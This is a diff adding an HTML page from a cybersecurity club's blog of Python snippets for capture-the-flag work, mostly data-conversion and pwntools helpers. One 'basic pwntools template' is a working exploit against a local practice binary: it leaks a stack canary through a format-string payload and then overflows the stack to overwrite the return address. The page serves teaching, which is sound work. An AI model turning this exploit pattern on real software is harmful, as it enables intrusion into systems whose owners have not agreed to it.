@@ -1,0 +1,76 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Some commonly used and helpful python snippets</title><meta content="Some commonly used and helpful python snippets" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/resources/python2/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Some commonly used and helpful python snippets" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/resources/python2/ property=twitter:url><meta content="Some commonly used and helpful python snippets" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/resources/python2/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>python2</span></div><time datetime=2025-01-08>Published on: <span class=accent-data>2025-01-08</span></time><address rel=author>By <span class=accent-data>exploiitm </span></address><h1>Some commonly used and helpful python snippets</h1><h2 id=python-snippets>Python Snippets</h2><ul><li>hex to bytes to string</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>hex_value </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"4765656b73666f724765656b73"
+</span><span>byte_str </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>bytes</span><span style=color:#fdf4c1>.fromhex(hex_value)
+</span><span>result_str </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>byte_str.decode(</span><span style=color:#b8bb26>'utf-8'</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>string to bytes</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>byte_arr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>str</span><span style=color:#fdf4c1>.encode(</span><span style=color:#b8bb26>"Foo"</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>string to hexdump</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>byte_out </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"string"</span><span style=color:#fdf4c1>.encode().hex()
+</span></code></pre><ul><li>hex string to int</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>x </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"deadbeef"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span><span>x </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"0xdeadbeef"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)
+</span><span>x </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"0xdeadbeef"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>integer to binary/octal/hexadecimal</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fabd2f>bin</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>23</span><span style=color:#fdf4c1>)  
+</span><span style=color:#fabd2f>oct</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>31</span><span style=color:#fdf4c1>)
+</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>26</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>basic pwntools template</ul><pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span style=font-style:italic;color:#928374>#!/usr/bin/python
+</span><span style=color:#fa5c4b>import </span><span>pwn
+</span><span>
+</span><span style=font-style:italic;color:#928374># we use a separate pty to resolve IO issues on some terminals
+</span><span>pty </span><span style=color:#fe8019>= </span><span>pwn.process.</span><span style=color:#fdf4c1>PTY
+</span><span>proc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>"./a.out"</span><span style=color:#fdf4c1>, stdin </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pty, stdout </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pty)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"lies at "</span><span style=color:#fdf4c1>)
+</span><span>addr </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>proc.recvline().decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>).strip()
+</span><span style=font-style:italic;color:#928374># print("addr =", addr)
+</span><span>
+</span><span>addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(addr, </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span>
+</span><span>pad </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"-" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>11
+</span><span style=color:#fabd2f>buffer </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"a" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>32
+</span><span>format_string_payload </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>buffer </span><span style=color:#fe8019>+ </span><span>pad </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%21$p"
+</span><span>
+</span><span style=color:#fdf4c1>proc.sendline(format_string_payload)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fdf4c1>proc.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"2020"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fdf4c1>proc.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"06"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fdf4c1>proc.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"16"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"to " </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>pad)
+</span><span>
+</span><span>canary </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>proc.recvline().decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>).strip()
+</span><span style=font-style:italic;color:#928374># print("canary =", canary)
+</span><span>
+</span><span>canary </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(canary, </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"you?"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fabd2f>buffer </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"a" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>32
+</span><span>format_string </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"b" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>16
+</span><span>
+</span><span>padding </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"c" </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8
+</span><span>
+</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>buffer </span><span style=color:#fe8019>+ </span><span>format_string </span><span style=color:#fe8019>+ </span><span>padding </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>pwn.p64(canary) </span><span style=color:#fe8019>+ </span><span>padding </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>pwn.p64(addr)
+</span><span>
+</span><span style=color:#fdf4c1>proc.sendline(payload)
+</span><span>
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fdf4c1>proc.recvline()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"############################# PROGRAM OUTPUT #########################"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(proc.recvline().decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>))
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"######################################################################"</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>connect to a netcat port</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>io </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"new.domain.name"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>)
+</span><span>io </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"12.12.12.12"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>5000</span><span style=color:#fdf4c1>)
+</span></code></pre><ul><li>receive xyz after connecting</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fdf4c1>io.recv(n) </span><span style=font-style:italic;color:#928374># nbytes
+</span><span style=color:#fdf4c1>io.recvline() </span><span style=font-style:italic;color:#928374># till newline
+</span><span style=color:#fdf4c1>io.recvuntil(</span><span style=color:#b8bb26>"string"</span><span style=color:#fdf4c1>) </span><span style=font-style:italic;color:#928374>#receive until the occurrence of string
+</span></code></pre><ul><li>send xyz after connecting</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fdf4c1>io.send(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'bytes'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>io.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'bytes'</span><span style=color:#fdf4c1>) </span><span style=font-style:italic;color:#928374># also sends a newline
+</span></code></pre><ul><li>convert an integer to 32/64 byte address little-endian</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fdf4c1>pwn.p32(some_integer)
+</span><span style=color:#fdf4c1>pwn.p64(some_integer)
+</span></code></pre><ul><li>same as above, but big-endian, and signed</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fdf4c1>pwn.p64(some_int, endian</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"big"</span><span style=color:#fdf4c1>, sign</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>)
+</span></code></pre><p class=tags-data><a href=/blog/tags/scripting>/scripting/</a> <a href=/blog/tags/python-programming>/Python Programming/</a></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
